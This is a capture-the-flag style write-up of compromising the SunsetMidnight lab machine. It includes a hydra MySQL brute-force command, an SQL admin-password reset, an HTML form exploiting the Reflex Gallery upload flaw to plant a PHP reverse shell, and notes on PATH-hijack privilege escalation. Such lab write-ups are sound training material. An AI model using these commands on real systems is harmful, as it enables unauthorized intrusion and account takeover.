#### Enumeration

Browsing to port 80 HTTP service through IP address fails and it returns a domain name ```sunset-midnight```. We need to modify DNS settings first.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_13h44m48s_001.png)

We add a DNS rule in ```/etc/hosts``` file.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_13h49m45s_002.png)
 
Browsing to port 80 HTTP service again, and this time we see a webpage built with WordPress.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_13h54m51s_003.png)

The WordPress plugin we find is ```Simply Poll``` but its real version is 1.5, not 1.4.1 which has a vulnerability.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h06m07s_004.png)

After a lot of searching, I can't find the breakthrough of the WordPress website. So I move to port 3306 and try to brute-force database password.

I try to use the account ```wordpress``` but fail. [(*understanding max_connect_errors*)](https://www.virtual-dba.com/blog/mysql-max-connect-errors/)

```
hydra -l root -P ~/Documents/rockyou.txt -s 3306 -t 4 -f 192.168.128.88 mysql
```

Change the account to root to try and we successfully get the password.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h49m01s_005.png)

Browsing to WordPress database we We can change the password to ```admin123```.

```
UPDATE wp_users SET user_pass = MD5('admin123') WHERE ID = '1';
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h52m50s_006.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h53m03s_007.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h53m26s_008.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_15h54m55s_009.png)

Logging in to WordPress dashboard. We can [upload and activate a malicious plugin](https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#uploading-and-activating-malicious-plugin).

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h10m32s_010.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h11m44s_011.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h13m11s_012.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h13m34s_013.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h18m32s_014.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h22m38s_015.png)

According to the [exploit](https://www.exploit-db.com/exploits/36374) instructions we create an html file for uploading.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h23m25s_016.png)

```html
<form method="POST" action="http://sunset-midnight/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2022&Month=02" enctype="multipart/form-data" >
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Pwn!">
</form>
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h24m19s_017.png)

Now let's prepare a [php file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) with the reverse shell command.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h29m08s_018.png)

Use firefox to open our test.html file and upload the php malicious file.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h32m46s_019.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h33m10s_020.png)

Start listening to 80 port and browse to the address indicated by the vulnerability.

```
http://sunset-midnight/wp-content/uploads/2022/02/php-reverse-shell.php
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h34m54s_021.png)

#### Priviledge Escalation

Checking the ```wp-config.php``` first.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h52m27s_022.png)

Trying to use the credential to login through ssh.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_16h56m00s_023.png)

We find an unknown binary in the scan results of linpeas.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_17h00m41s_024.png)

Checking this unknown binary reveals that it executes a command with an unspecified path.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_17h03m46s_025.png)

We create our service to run the malicious code.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/SunsetMidnight/SunsetMidnight_2022.02.27_17h09m59s_026.png)
